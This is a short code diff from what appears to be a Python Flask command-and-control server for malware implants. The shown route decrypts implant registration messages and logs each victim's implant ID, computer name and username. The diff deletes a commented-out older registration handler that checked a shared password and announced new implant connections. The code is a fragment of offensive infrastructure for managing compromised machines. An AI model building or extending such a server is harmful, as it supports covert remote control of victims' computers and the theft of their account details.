@@ -45,7 +45,6 @@ def handle_register():
         # Parse the decrypted message using protobuf
         register = RegisterImplant()
         register.ParseFromString(decrypted_message)
-        # register.PublicKey = base64.b64decode(register.PublicKey)
 
         print(f'[+] New Implant: from {ip}')
         print(f'[+]    * ImplantID: {register.ImplantID}')
@@ -66,25 +65,6 @@ def handle_register():
     except Exception as e:
         print(f"Error during registration: {str(e)}")
         return Response("Registration failed", status=500)
-
-    # ip = request.remote_addr
-    # reg_data = request.get_data()
-    # register = RegisterImplant()
-    # register.ParseFromString(reg_data)
-    # print(f'[+] New Implant: from {request.remote_addr}')
-    # print(f'[+]    * ImplantID: {register.ImplantID}')
-    # print(f'[+]    * ComputerName: {register.ComputerName}')
-    # print(f'[+]    * Username: {register.Username}')
-    # print(f'[+]    * Password: {register.Password}')
-
-    # if register.Password != PASSWORD:
-    #     abort(404)
-
-    # r = register_implant(make_implant(register, ip))
-
-    # print("[+] Watch out sexy ;) a New Implant connected!")
-
-    # return SUCCESSFUL
 
 @rpc.route("/checkin", methods=["POST"])
 def checkin():
